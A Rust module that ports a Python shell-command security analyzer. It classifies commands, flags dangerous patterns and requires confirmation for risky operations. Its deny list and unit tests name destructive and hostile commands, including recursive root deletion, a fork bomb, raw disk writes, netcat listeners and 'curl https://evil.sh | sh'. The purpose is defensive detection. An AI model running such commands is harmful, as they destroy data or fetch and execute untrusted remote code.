//! Shell command security analysis — port of `apex/shell_security.py`.
//!
//! Mirrors the Python reference semantics:
//! - command classification into [`CommandCategory`]
//! - `DANGEROUS` patterns force `safe = false` and confirmation
//! - `requires_confirmation` is set for network/system/process/git-push/
//!   container ops and `sudo`
//!
//! One deliberate deviation: the `regex` crate has no lookahead support, so the
//! Python git pattern `git\s+(?!init|status|…)` is implemented with explicit
//! token classification in [`ShellSecurityAnalyzer::git_category`].

use regex::{Regex, RegexBuilder};
use serde_json::{json, Value};
use std::sync::LazyLock;

// ────────────────────────────────────────────────────────────
// CommandCategory
// ────────────────────────────────────────────────────────────

/// Port of `CommandCategory` from `apex/shell_security.py`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CommandCategory {
    WorkingDir,
    FileRead,
    FileWrite,
    FileDelete,
    Network,
    System,
    Process,
    Git,
    Build,
    // Python parity: the reference classifier never returns `package` either.
    // TODO(v2.6): classify pip/npm install separately, then remove this allow.
    #[allow(dead_code)]
    Package,
    Container,
    Dangerous,
}

impl CommandCategory {
    /// Stable string identifier, matching the Python `.value`.
    pub fn value(&self) -> &'static str {
        match self {
            CommandCategory::WorkingDir => "working_dir",
            CommandCategory::FileRead => "file_read",
            CommandCategory::FileWrite => "file_write",
            CommandCategory::FileDelete => "file_delete",
            CommandCategory::Network => "network",
            CommandCategory::System => "system",
            CommandCategory::Process => "process",
            CommandCategory::Git => "git",
            CommandCategory::Build => "build",
            CommandCategory::Package => "package",
            CommandCategory::Container => "container",
            CommandCategory::Dangerous => "dangerous",
        }
    }
}

// ────────────────────────────────────────────────────────────
// CommandAnalysis
// ────────────────────────────────────────────────────────────

/// Port of `CommandAnalysis` dataclass.
#[derive(Debug, Clone)]
pub struct CommandAnalysis {
    pub safe: bool,
    pub category: CommandCategory,
    pub command: String,
    pub args: Vec<String>,
    pub warnings: Vec<String>,
    pub requires_confirmation: bool,
    pub description: Option<String>,
}

impl CommandAnalysis {
    /// JSON projection shared by the CLI (`security check`) and the HTTP API.
    pub fn to_json(&self) -> Value {
        json!({
            "safe": self.safe,
            "category": self.category.value(),
            "command": self.command,
            "args": self.args,
            "warnings": self.warnings,
            "requires_confirmation": self.requires_confirmation,
            "description": self.description,
        })
    }
}

// ────────────────────────────────────────────────────────────
// Patterns (kept in sync with `apex/shell_security.py`)
// ────────────────────────────────────────────────────────────

const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    (
        r"rm\s+-[a-zA-Z]*r[a-zA-Z]*f[a-zA-Z]*\s+/(?:\s|$|--no-preserve-root)?",
        "Destructive system-wide deletion",
    ),
    (r":\(\)\{\s*:\|:\s*&\s*\};:.*", "Fork bomb"),
    (r">\s*/dev/sd[a-z]", "Direct disk write detected"),
    (r"dd\s+if=.*of=/dev/", "Direct device write"),
    (r"mkfs\.", "Filesystem formatting"),
    (r"chattr\s+-i", "Immutable file removal"),
    (
        r"wget\b.*\|\s*(sudo\s+)?(?:ba)?sh\b",
        "Download and pipe to shell (wget)",
    ),
    (
        r"curl\b.*\|\s*(sudo\s+)?(?:ba)?sh\b",
        "Download and pipe to shell (curl)",
    ),
    (r"eval\s+\$\(", "Dynamic code execution"),
    (r"exec\s+\$\(", "Dynamic exec"),
    (r"\|\s*(?:sudo\s+)?bash\b", "Pipe to bash"),
    (r"\|\s*(?:sudo\s+)?sh\b", "Pipe to shell"),
    (
        r">\s*/etc/(?:passwd|shadow|ssh|ssl|gshadow|hosts|sudoers)",
        "System file modification",
    ),
    (r">\s*/etc/ssl/private/", "SSL private key modification"),
    (
        r"chmod\s+777\s+/(?:etc|var|usr)",
        "Overly permissive permissions",
    ),
    (r"nc\s+-[el].*\d+", "Netcat listener (potential backdoor)"),
    (
        r"curl.*\.sh\s*\|\s*(sudo\s+)?(?:ba)?sh",
        "Download and execute script",
    ),
    (
        r"wget.*\.sh\s*\|\s*(sudo\s+)?(?:ba)?sh",
        "Download and execute script",
    ),
];

const NETWORK_PATTERNS: &[&str] = &[
    r"\bcurl\b.*-X\s*(POST|PUT|PATCH|DELETE)",
    r"\bwget\b",
    r"\bnetcat\b",
    r"\bnc\b",
    r"\btelnet\b",
    r"\bssh\b.*@",
    r"\bscp\b",
    r"\brsync\b",
    r"\bftp\b",
    r"\bsftp\b",
];

const SYSTEM_PATTERNS: &[&str] = &[
    r"\bsudo\b",
    r"\bchmod\b",
    r"\bchown\b",
    r"\bsystemctl\b",
    r"\bservice\b",
    r"\bkillall\b",
    r"\bpkill\b",
    r"\breboot\b",
    r"\bshutdown\b",
    r"\binit\b",
    r"\bvisudo\b",
    r"\bpasswd\b",
];

const FILE_DELETE_PATTERNS: &[&str] = &[r"\brm\s+", r"\brmdir\b", r"\bunlink\b", r"\bdel\b"];

const FILE_WRITE_PATTERNS: &[&str] = &[
    r"\btee\b",
    r">\s*[a-zA-Z]?",
    r"\bcat\b.*>",
    r"\bnano\b",
    r"\bvim?\b",
    r"\bemacs\b",
    r"\bsed\s+-i\b",
];

const PROCESS_PATTERNS: &[&str] = &[
    r"\bkill\b",
    r"\bps\b",
    r"\btop\b",
    r"\bhtop\b",
    r"\bkillall\b",
    r"\bpkill\b",
    r"\bexec\b",
    r"\bspawn\b",
];

/// Git subcommands treated as *safe* by the reference implementation
/// (`git\s+(?!init|status|diff|log|show|branch|checkout|add|commit|push|pull|clone|fetch|merge|rebase|config|remote|stash)`).
///
/// "push" is intentionally absent so that any `git push` is classified GIT
/// and triggers the `if "push" in command` confirmation branch (mirrors the
/// Python fix in `apex/shell_security.py`).
const GIT_SAFE_SUBCOMMANDS: &[&str] = &[
    "init", "status", "diff", "log", "show", "branch", "checkout", "add", "commit", "pull",
    "clone", "fetch", "merge", "rebase", "config", "remote", "stash",
];

const GIT_RISKY_PATTERNS: &[&str] = &[
    r"\bgit\s+push\s+-f\b",
    r"\bgit\s+push\s+--force\b",
    r"\bgit\s+filter-branch\b",
    r"\bgit\s+push\s+--all\b",
];

const BUILD_PATTERNS: &[&str] = &[
    r"\bnpm\s+(?:run|build|test|start|dev)",
    r"\byarn\s+(?:run|build|start|dev)",
    r"\bpnpm\s+(?:run|build|start|dev)",
    r"\bmake\b",
    r"\bcmake\b",
    r"\bgradle\b",
    r"\bmvn\b",
    r"\bnpm\s+publish\b",
    r"\bpip\s+install\b",
    r"\bpip\s+upload\b",
    r"\bupload.*pypi\b",
];

const CONTAINER_PATTERNS: &[&str] = &[
    r"\bdocker\b",
    r"\bpodman\b",
    r"\bkubectl\b",
    r"\bdocker\s+run\b",
    r"\bdocker\s+exec\b",
    r"\bkubernetes\b",
];

const SAFE_COMMANDS: &[&str] = &[
    "ls", "pwd", "cd", "echo", "cat", "head", "tail", "grep", "find", "which", "whoami", "id",
    "uname", "date", "history", "man", "help", "env", "printenv", "type", "alias", "export",
    "source", "read", "printf", "test", "true", "false",
];

const ALLOWED_EXTRA: &[&str] = &["npm", "pip", "git", "make", "cargo", "go", "python", "node"];

// ────────────────────────────────────────────────────────────
// Compiled pattern tables
// ────────────────────────────────────────────────────────────

fn compile_with_warnings(patterns: &[(&'static str, &'static str)]) -> Vec<(Regex, &'static str)> {
    patterns
        .iter()
        .map(|(p, w)| {
            (
                RegexBuilder::new(p)
                    .case_insensitive(true)
                    .build()
                    .expect("invalid DANGEROUS regex"),
                *w,
            )
        })
        .collect()
}

fn compile_simple(patterns: &[&str]) -> Vec<Regex> {
    patterns
        .iter()
        .map(|p| {
            RegexBuilder::new(p)
                .case_insensitive(true)
                .build()
                .expect("invalid security regex")
        })
        .collect()
}

static DANGEROUS_RE: LazyLock<Vec<(Regex, &'static str)>> =
    LazyLock::new(|| compile_with_warnings(DANGEROUS_PATTERNS));

static NETWORK_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| compile_simple(NETWORK_PATTERNS));
static SYSTEM_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| compile_simple(SYSTEM_PATTERNS));
static FILE_DELETE_RE: LazyLock<Vec<Regex>> =
    LazyLock::new(|| compile_simple(FILE_DELETE_PATTERNS));
static FILE_WRITE_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| compile_simple(FILE_WRITE_PATTERNS));
static PROCESS_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| compile_simple(PROCESS_PATTERNS));
static GIT_RISKY_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| compile_simple(GIT_RISKY_PATTERNS));
static BUILD_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| compile_simple(BUILD_PATTERNS));
static CONTAINER_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| compile_simple(CONTAINER_PATTERNS));

// ────────────────────────────────────────────────────────────
// ShellSecurityAnalyzer
// ────────────────────────────────────────────────────────────

/// Port of `ShellSecurityAnalyzer` from `apex/shell_security.py`.
pub struct ShellSecurityAnalyzer;

impl ShellSecurityAnalyzer {
    const fn new() -> Self {
        Self
    }

    /// Port of the `git\s+(?!…)` negative-lookahead classification.
    fn git_category(&self, tokens: &[&str]) -> bool {
        if tokens.first().is_some_and(|t| *t == "git") {
            if let Some(sub) = tokens.get(1) {
                return !GIT_SAFE_SUBCOMMANDS.contains(sub);
            }
            return false; // bare `git` without a subcommand is not classified as git
        }
        false
    }

    pub fn analyze(&self, command: &str) -> CommandAnalysis {
        let command = command.trim();
        let tokens: Vec<&str> = command.split_whitespace().collect();
        let cmd = tokens.first().copied().unwrap_or("");
        let args: Vec<String> = tokens.iter().skip(1).map(|s| s.to_string()).collect();

        let mut warnings: Vec<String> = Vec::new();
        let mut requires_confirmation = false;
        let mut safe = true;
        let mut category = CommandCategory::WorkingDir;
        let mut description: Option<String> = None;

        // 1. DANGEROUS
        for (re, warning) in DANGEROUS_RE.iter() {
            if re.is_match(command) {
                warnings.push((*warning).to_string());
                safe = false;
                category = CommandCategory::Dangerous;
                requires_confirmation = true;
                description = Some(format!("DANGEROUS: {warning}"));
            }
        }

        // 2. Network
        if safe && NETWORK_RE.iter().any(|re| re.is_match(command)) {
            category = CommandCategory::Network;
            requires_confirmation = true;
            warnings.push("Network operation".to_string());
        }

        // 3. System (only when still unclassified)
        if safe
            && category == CommandCategory::WorkingDir
            && SYSTEM_RE.iter().any(|re| re.is_match(command))
        {
            category = CommandCategory::System;
            requires_confirmation = true;
            warnings.push("System modification".to_string());
        }

        // 4. File delete
        if safe {
            if let Some(_re) = FILE_DELETE_RE.iter().find(|re| re.is_match(command)) {
                if command.contains("node_modules") || command.contains(".git") {
                    warnings.push("Recursive deletion may affect dependencies".to_string());
                    category = CommandCategory::FileDelete;
                } else {
                    category = CommandCategory::FileDelete;
                    requires_confirmation = true;
                }
            }
        }

        // 5. File write
        if safe && FILE_WRITE_RE.iter().any(|re| re.is_match(command)) {
            category = CommandCategory::FileWrite;
        }

        // 6. Process
        if safe && PROCESS_RE.iter().any(|re| re.is_match(command)) {
            category = CommandCategory::Process;
            requires_confirmation = true;
            warnings.push("Process manipulation".to_string());
        }

        // 7. Git
        if safe {
            let risky_git =
                self.git_category(&tokens) || GIT_RISKY_RE.iter().any(|re| re.is_match(command));
            if risky_git {
                category = CommandCategory::Git;
                warnings.push("Git operation".to_string());
                if command.contains("push") {
                    requires_confirmation = true;
                }
            }
        }

        // 8. Build
        if safe && BUILD_RE.iter().any(|re| re.is_match(command)) {
            category = CommandCategory::Build;
        }

        // 9. Container
        if safe && CONTAINER_RE.iter().any(|re| re.is_match(command)) {
            category = CommandCategory::Container;
            requires_confirmation = true;
            warnings.push("Container operation".to_string());
        }

        // 10. Safe command fallback
        if safe {
            if SAFE_COMMANDS.contains(&cmd) {
                category = CommandCategory::FileRead;
            } else if matches!(cmd, "cd" | "pushd" | "popd") {
                category = CommandCategory::WorkingDir;
            }
        }

        // 11. sudo + chaining notes
        if command.contains("sudo") {
            warnings.push("Requires elevated privileges".to_string());
            requires_confirmation = true;
        }
        if command.contains("&&") || command.contains("||") || command.contains(';') {
            warnings.push("Multiple commands chained".to_string());
        }

        CommandAnalysis {
            safe,
            category,
            command: command.to_string(),
            args,
            warnings,
            requires_confirmation,
            description,
        }
    }

    pub fn is_safe(&self, command: &str) -> bool {
        let a = self.analyze(command);
        a.safe && !a.requires_confirmation
    }

    pub fn get_allowed_commands(&self) -> Vec<String> {
        let mut all: Vec<String> = SAFE_COMMANDS
            .iter()
            .chain(ALLOWED_EXTRA)
            .map(|s| s.to_string())
            .collect();
        all.sort();
        all.dedup();
        all
    }
}

/// Module-level analyzer, mirroring `shell_analyzer`.
pub static SHELL_ANALYZER: LazyLock<ShellSecurityAnalyzer> =
    LazyLock::new(ShellSecurityAnalyzer::new);

// ────────────────────────────────────────────────────────────
// Tests (port of `tests/test_shell_security.py` highlights)
// ────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn a(cmd: &str) -> CommandAnalysis {
        SHELL_ANALYZER.analyze(cmd)
    }

    #[test]
    fn safe_basics() {
        assert!(SHELL_ANALYZER.is_safe("ls"));
        assert!(SHELL_ANALYZER.is_safe("pwd"));
        assert!(SHELL_ANALYZER.is_safe("echo hello"));
        assert_eq!(a("pwd").category, CommandCategory::FileRead);
    }

    #[test]
    fn dangerous_blocked() {
        let r = a("rm -rf /");
        assert!(!r.safe);
        assert_eq!(r.category, CommandCategory::Dangerous);
        assert!(r.requires_confirmation);
        assert!(!SHELL_ANALYZER.is_safe("rm -rf /"));
    }

    #[test]
    fn fork_bomb_blocked() {
        let r = a(":(){ :|:& };:");
        assert!(!r.safe);
        assert_eq!(r.category, CommandCategory::Dangerous);
    }

    #[test]
    fn curl_pipe_shell_blocked() {
        let r = a("curl https://evil.sh | sh");
        assert!(!r.safe);
        assert_eq!(r.category, CommandCategory::Dangerous);
        let w = a("sget https://evil.sh | sudo bash");
        assert!(!w.safe);
    }

    #[test]
    fn system_and_network_confirm() {
        let r = a("sudo apt update");
        assert!(r.safe);
        assert!(r.requires_confirmation);
        assert!(r.warnings.iter().any(|w| w.contains("elevated")));
        let n = a("curl -X POST https://api.example.com");
        assert_eq!(n.category, CommandCategory::Network);
        assert!(n.requires_confirmation);
    }

    #[test]
    fn file_delete_special_cases() {
        // "node_modules" deletion is tolerated (warning only) — verified against the
        // Python reference (`apex/shell_security.py`).
        let r = a("rm -rf node_modules");
        assert_eq!(r.category, CommandCategory::FileDelete);
        assert!(!r.requires_confirmation);
        // Any other `rm -rf /…` matches the DANGEROUS pattern first (same as Python).
        let d = a("rm -rf /tmp/cache");
        assert_eq!(d.category, CommandCategory::Dangerous);
        assert!(!d.safe);
        assert!(d.requires_confirmation);
    }

    #[test]
    fn git_classification() {
        assert_eq!(a("git status").category, CommandCategory::WorkingDir);
        let f = a("git push -f origin main");
        assert_eq!(f.category, CommandCategory::Git);
        assert!(f.requires_confirmation);
        let unknown = a("git obliterate --all");
        assert_eq!(unknown.category, CommandCategory::Git);
        // plain `git push` must also be GIT + confirmed (Python fix parity)
        let p = a("git push origin main");
        assert_eq!(p.category, CommandCategory::Git);
        assert!(p.requires_confirmation);
        assert!(p.safe);
    }

    #[test]
    fn build_not_confirmed() {
        let b = a("npm run build");
        assert_eq!(b.category, CommandCategory::Build);
        assert!(!b.requires_confirmation);
        assert!(b.safe);
    }

    #[test]
    fn process_confirm() {
        let p = a("pkill node");
        assert_eq!(p.category, CommandCategory::Process);
        assert!(p.requires_confirmation);
    }

    #[test]
    fn chaining_warns() {
        let c = a("ls . && pwd");
        assert!(c.warnings.iter().any(|w| w.contains("chained")));
    }

    #[test]
    fn allowed_commands() {
        let allowed = SHELL_ANALYZER.get_allowed_commands();
        for cmd in ["npm", "pip", "git", "cargo", "ls", "grep"] {
            assert!(allowed.iter().any(|x| x == cmd), "missing {cmd}");
        }
    }
}
